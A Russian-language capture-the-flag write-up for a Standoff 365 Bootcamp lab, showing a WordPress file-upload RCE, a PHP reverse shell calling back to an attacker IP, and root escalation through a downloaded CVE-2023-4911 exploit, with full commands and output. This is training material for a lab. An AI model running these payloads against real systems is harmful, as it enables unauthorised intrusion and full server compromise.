# Райтап: Standoff 365 Bootcamp — Web-1-2 (CVE-2023-4911)

**Цель задания:** Получить первоначальный доступ к веб-приложению, повысить привилегии до `root` и прочитать файл с флагом.

**Целевой хост:** `library.edu.stf` (IP: `10.124.1.221`)
**Уязвимость:** Повышение привилегий в glibc (CVE-2023-4911, Looney Tunables).

---

## Шаг 1. Первоначальный доступ (RCE)

В ходе разведки было обнаружено, что веб-приложение на базе WordPress (порт 80) уязвимо к загрузке произвольных файлов через AJAX-запрос. Для эксплуатации использовался готовый скрипт `51505.py`, который загружает веб-шелл и выполняет команды на сервере от имени пользователя `www-data`.

**Проверка соединения и сбор информации:**
```bash
python3 51505.py library.edu.stf "ls -la"
```
*Вывод подтвердил наличие файловой системы WordPress и права пользователя `www-data`.*

**Проверка версии glibc:**
```bash    
python3 51505.py library.edu.stf "ldd --version"
```
*Вывод:*
`ldd (Ubuntu GLIBC 2.36-0ubuntu4) 2.36`.

Эта версия находится в уязвимом диапазоне для CVE-2023-4911 (2.34–2.38).

---

## Шаг 2. Получение полноценного Reverse Shell

Для удобства эксплуатации (так как веб-шелл не поддерживал сложные команды и перенаправления) было принято решение получить интерактивную оболочку.

1. **Подготовка на атакующей машине (Parrot OS):**
    Создаем PHP-скрипт `rev.php` для обратного подключения:
    ```php
    <?php
    set_time_limit(0);
    $ip = '10.127.214.138'; // IP атакующего
    $port = 4444;
    $sock = fsockopen($ip, $port);
    if (!$sock) { die("no connect\n"); }
    $proc = proc_open('/bin/bash', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
    ?>
    ```
    Запускаем HTTP-сервер для раздачи файла:
    ```bash
    python3 -m http.server 8000
    ```

2. **Загрузка шелла на целевой хост:**
    Через веб-шелл скачиваем `rev.php` на сервер:
    ```bash
    python3 51505.py library.edu.stf "curl -O http://10.127.214.138:8000/rev.php"
    ```

3. **Запуск слушателя на Parrot OS:**
    ```bash
    nc -lvnp 4444
    ```

4. **Активация шелла:**
    В другом терминале запускаем скачанный скрипт через веб-шелл:
    ```bash
    python3 51505.py library.edu.stf "php rev.php"
    ```
   *Результат:* В окне `nc` появляется приглашение командной строки. Получен стабильный доступ от `www-data`.

---

## Шаг 3. Эксплуатация CVE-2023-4911 (Looney Tunables)

Поскольку версия glibc уязвима, используем оптимизированный эксплойт (PoC), который обходит ASLR методом многопоточного брутфорса.

1. **Загрузка эксплойта:**
    В reverse shell скачиваем исходный код эксплойта:
    ```bash
    curl -L -o main.c https://raw.githubusercontent.com/jarpex/cve-2023-4911-exploit-optimized/main/x86_64/main.c
    ```

2. **Компиляция:**
    Проверяем наличие `gcc` и компилируем с поддержкой потоков:
    ```bash
    gcc main.c -o exp -pthread
    ```

3. **Запуск эксплойта:**
    ```bash
    ./exp
    ```

**Процесс эксплуатации (вывод эксплойта):**
    ```bash
    === CVE-2023-4911 (Looney Tunables) Exploit ===
    
    [+] /usr/bin/su is SUID root. Good.
    [*] Searching for system libc.so.6...
    [+] Found __libc_start_main at offset: 0x23540 in /lib/x86_64-linux-gnu/libc.so.6
    [+] Patched libc.so.6 saved (patched __libc_start_main).
    [+] Trap directory created.
    [*] Detected glibc version: 2.36
    [*] Running silent vulnerability trigger (su --help)...
    [+] VULNERABLE! Target crashed with signal 11 (Segmentation fault).
    [*] Calibrating environment (20 runs)...
    [+] Dynamic delay set to: 193.50 ms
    
    [*] Starting brute-force on 4 cores...
    [*] Attempts: 5008 | Speed: 21/s | Elapsed: 244s | Crashes: 0
    
    [+] SUCCESS! Shell is running.
    [*] Attempts: 5011 | Speed: 3/s | Elapsed: 245s | Crashes: 0
    
    [+] Exploit completed successfully!
    ```
*Эксплойт успешно угадал адрес в памяти с 5011-й попытки (примерно за 4 минуты) и выполнил полезную нагрузку.*

---

## Шаг 4. Получение флага и повышение привилегий

После завершения работы эксплойта в текущей сессии (в окне `nc`) проверяем права:
```bash
id
```
*Вывод:*
```bash
uid=0(root) gid=33(www-data) groups=33(www-data)
```
Права `uid=0` подтверждают успешное повышение привилегий до `root`. 

Читаем файл с флагом в домашней директории (он был найден в `/home/lpeflag`):
```bash
cat /home/lpeflag
```
*Вывод:*
```bash
8b134ad9-30bb-4485-8179-fffbed398c40
```
**Флаг:** `8b134ad9-30bb-4485-8179-fffbed398c40`

---
*Райтап подготовлен для сдачи задания в рамках Bootcamp Standoff 365.*
